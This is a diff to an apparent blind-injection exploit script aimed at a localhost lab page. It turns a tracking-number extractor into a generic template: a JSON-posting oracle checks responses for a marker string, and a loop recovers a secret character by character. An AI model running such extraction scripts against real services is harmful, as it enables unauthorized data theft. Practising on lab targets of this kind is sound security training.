@@ -8,7 +8,7 @@ def oracle(t):
     r = requests.post(
         "http://127.0.0.1/index.php",  #### url
         headers = {"Content-Type": "application/json"},
-        data = json.dumps({"trackingNum": t})
+        data = json.dumps({"VARIABLE": t})  #### Inicio del jason que se enviará
     )
     return "bmdyy" in r.text ### respuesta afirmativa en " "
 
@@ -25,7 +25,6 @@ for _ in range(32): # Repeat the following 32 times
             break # ... and break out of the loop
 trackingNum += "}" # Append known '}' to end of tracking number
 
-# Make sure the tracking number is correct
 assert (oracle(trackingNum) == True)
 
-print("Tracking Number: " + trackingNum)
+print("DATA: " + trackingNum)
